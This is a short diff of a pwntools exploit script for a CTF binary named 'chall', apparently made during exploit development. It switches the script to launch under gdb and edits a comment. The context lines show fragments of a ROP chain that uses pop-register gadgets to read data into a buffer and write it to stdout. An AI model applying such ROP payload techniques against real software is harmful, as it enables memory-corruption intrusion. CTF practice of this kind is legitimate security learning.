@@ -16,7 +16,7 @@ c
 context.terminal = ["tmux", "splitw", "-h"]
 elf = context.binary = ELF("./chall")
 p = process(elf.path)
-# p = gdb.debug(elf.path, gdbscript=gdbcmds)
+p = gdb.debug(elf.path, gdbscript=gdbcmds)
 
 a_username = p64(0x4040c0)
 a_puts = p64(elf.symbols["challenge"] + 22)
@@ -43,7 +43,7 @@ payload += p64(0x3)
 payload += POP_RSI + a_username
 payload += POP_RDX + p64(0x29)
 payload += a_read
-#
+
 # # Step 4: write to stdout
 payload += POP_RDI + p64(0x1)
 payload += POP_RSI + a_username
